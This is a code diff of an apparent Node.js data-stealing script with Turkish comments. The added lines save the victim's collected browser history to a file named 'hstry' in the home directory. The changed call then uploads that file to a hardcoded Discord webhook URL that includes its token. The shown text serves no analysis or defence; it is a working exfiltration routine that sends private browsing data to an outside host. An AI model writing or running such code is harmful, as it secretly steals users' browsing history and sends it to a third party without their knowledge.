@@ -94,6 +94,21 @@ console.log(browserHistory);
   // browser ------------------------------------------------------------------------------------------------------------------------------------------------
 
 
+// string to file ------------------------------------------------------------------------------------------------------------------------------------------------
+
+function stringToFile(content, filePath) {
+  fs.writeFileSync(filePath, content);
+  console.log(`Metin dosyası oluşturuldu: ${filePath}`);
+}
+
+let filePath = path.resolve(homeDir, 'hstry')
+
+
+stringToFile(browserHistory, filePath);
+
+// string to file ------------------------------------------------------------------------------------------------------------------------------------------------
+
+
 
 // webhook ------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -133,6 +148,6 @@ ${fs.readFileSync(targetFile, 'utf-8')}\r
 // Fonksiyonu kullanarak dosyayı webhook'a gönderme örneği
 const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
 
-sendFileToWebhook(webhookUrl, browserHistory);
+sendFileToWebhook(webhookUrl, filePath);
 
 // webhook ------------------------------------------------------------------------------------------------------------------------------------------------
